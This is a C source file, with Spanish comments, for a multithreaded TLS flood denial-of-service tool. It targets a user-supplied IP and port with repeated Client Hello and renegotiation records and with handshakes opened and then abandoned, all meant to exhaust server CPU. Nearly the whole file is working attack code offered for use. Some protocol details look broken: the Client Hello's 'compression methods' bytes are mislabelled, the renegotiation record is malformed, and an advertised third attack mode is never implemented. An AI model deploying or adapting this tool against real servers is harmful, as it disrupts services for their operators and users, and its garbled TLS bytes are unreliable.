#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netinet/tcp.h>

#define MAX_THREADS 100
#define MAX_RENEGOTIATIONS 10

// TLS Client Hello básico
const unsigned char tls_client_hello[] = {
    // TLS Record Layer
    0x16,                               // Content Type: Handshake
    0x03, 0x01,                         // Version: TLS 1.0
    0x00, 0xdc,                         // Length: 220
    
    // Handshake Protocol: Client Hello
    0x01,                               // Type: Client Hello
    0x00, 0x00, 0xd8,                   // Length: 216
    0x03, 0x01,                         // Version: TLS 1.0
    
    // Random (32 bytes)
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
    
    0x00,                               // Session ID Length: 0
    0x00, 0x66,                         // Cipher Suites Length: 102
    0xc0, 0x2c, 0xc0, 0x2b, 0xc0, 0x30, 0xc0, 0x2f, // Cipher Suites
    0x00, 0x9f, 0x00, 0x9e, 0xc0, 0x24, 0xc0, 0x23,
    0xc0, 0x28, 0xc0, 0x27, 0xc0, 0x0a, 0xc0, 0x09,
    0xc0, 0x14, 0xc0, 0x13, 0x00, 0x9d, 0x00, 0x9c,
    0x00, 0x3d, 0x00, 0x3c, 0x00, 0x35, 0x00, 0x2f,
    0xc0, 0x08, 0xc0, 0x12, 0x00, 0x0a, 0x00, 0x13,
    0x00, 0x09, 0x00, 0x63, 0x00, 0x62, 0x00, 0x15,
    0x00, 0x12, 0x00, 0x61, 0x00, 0x60, 0x00, 0x16,
    0x00, 0x0b, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x18,
    0x00, 0x17, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x07,
    0x00, 0x05, 0x00, 0x04, 0x00, 0xff, 0x01, 0x00,
    
    0x00, 0x0d,                         // Compression Methods Length: 13
    0x00, 0x08, 0x06, 0x01, 0x06, 0x02, 0x06, 0x03, // Compression Methods
    0x05, 0x01, 0x05, 0x02, 0x05, 0x03, 0x04, 0x01,
    0x04, 0x02, 0x04, 0x03,
    
    0x00, 0x00                          // Extensions Length: 0
};

// TLS Renegotiation Request
const unsigned char tls_renegotiate[] = {
    0x16,       // Handshake
    0x03, 0x01, // TLS 1.0
    0x00, 0x04, // Length: 4
    0x01,       // Renegotiation
    0x00, 0x00, 0x00 // Empty
};

void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

void *tls_renegotiation_flood(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    time_t start = time(NULL);
    unsigned long renegotiations = 0;
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            continue;
        }
        
        // Configurar socket
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        struct timeval timeout;
        timeout.tv_sec = 2;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
        
        // Conectar
        if(connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            // Enviar Client Hello inicial
            send(sock, tls_client_hello, sizeof(tls_client_hello), 0);
            
            // Recibir Server Hello (ignorar)
            char buffer[4096];
            recv(sock, buffer, sizeof(buffer), 0);
            
            // Realizar múltiples renegociaciones TLS
            for(int i = 0; i < MAX_RENEGOTIATIONS; i++) {
                // Enviar renegociación
                send(sock, tls_renegotiate, sizeof(tls_renegotiate), 0);
                renegotiations++;
                
                // Pequeña pausa
                usleep(10000);
            }
            
            if(renegotiations % 100 == 0) {
                printf("[TLS] Thread: %lu renegotiations to %s:%d\n", 
                       renegotiations, target_ip, target_port);
            }
        }
        
        close(sock);
        usleep(50000); // 50ms entre conexiones
    }
    
    printf("[TLS] Thread completed: %lu renegotiations\n", renegotiations);
    return NULL;
}

void *tls_handshake_flood(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    const SSL_METHOD *method;
    SSL_CTX *ctx;
    
    // Inicializar OpenSSL
    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if(!ctx) {
        return NULL;
    }
    
    time_t start = time(NULL);
    unsigned long handshakes = 0;
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            continue;
        }
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
        
        // Conectar
        if(connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            
            // Iniciar handshake TLS (consumirá CPU del servidor)
            SSL_connect(ssl);
            
            // Cerrar inmediatamente sin completar
            SSL_shutdown(ssl);
            SSL_free(ssl);
            
            handshakes++;
            
            if(handshakes % 50 == 0) {
                printf("[TLS-HS] %lu handshakes to %s:%d\n", 
                       handshakes, target_ip, target_port);
            }
        }
        
        close(sock);
        usleep(20000); // 20ms entre handshakes
    }
    
    SSL_CTX_free(ctx);
    printf("[TLS-HS] Thread: %lu handshakes attempted\n", handshakes);
    return NULL;
}

// Método principal: Flood TLS con renegociación
void *tls_flood_main(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    printf("[TLS-FLOOD] Starting TLS flood on %s:%d\n", target_ip, target_port);
    
    pthread_t reneg_threads[20];
    pthread_t hs_threads[20];
    
    // Iniciar threads de renegociación
    for(int i = 0; i < 20; i++) {
        pthread_create(&reneg_threads[i], NULL, tls_renegotiation_flood, arg);
    }
    
    // Iniciar threads de handshake
    for(int i = 0; i < 20; i++) {
        pthread_create(&hs_threads[i], NULL, tls_handshake_flood, arg);
    }
    
    // Esperar duración
    sleep(duration);
    
    printf("[TLS-FLOOD] Attack completed\n");
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("TLS Flood - Layer 7 SSL/TLS Attack\n");
        printf("===================================\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n\n", argv[0]);
        printf("Attack Types:\n");
        printf("1. TLS Renegotiation Flood\n");
        printf("2. TLS Handshake Flood\n");
        printf("3. SSL Session Resumption\n");
        printf("\nTarget: HTTPS servers (443), SMTP over TLS, etc.\n");
        return 1;
    }
    
    printf("\n========================================\n");
    printf("🔐 TLS FLOOD ATTACK - LAYER 7\n");
    printf("========================================\n");
    printf("Target: %s:%d\n", argv[1], atoi(argv[2]));
    printf("Duration: %s seconds\n", argv[3]);
    printf("Attack: TLS Renegotiation + Handshake Flood\n");
    printf("Effect: High CPU consumption on SSL servers\n");
    printf("========================================\n\n");
    
    // Inicializar OpenSSL
    init_openssl();
    
    printf("[INFO] Initializing TLS flood attack...\n");
    printf("[INFO] This will consume high CPU on SSL/TLS servers\n");
    printf("[INFO] Starting in 3 seconds...\n");
    sleep(3);
    
    // Ejecutar ataque principal
    tls_flood_main(argv);
    
    // Limpiar OpenSSL
    cleanup_openssl();
    
    printf("\n========================================\n");
    printf("[TLS] Attack finished\n");
    printf("========================================\n");
    
    return 0;
}
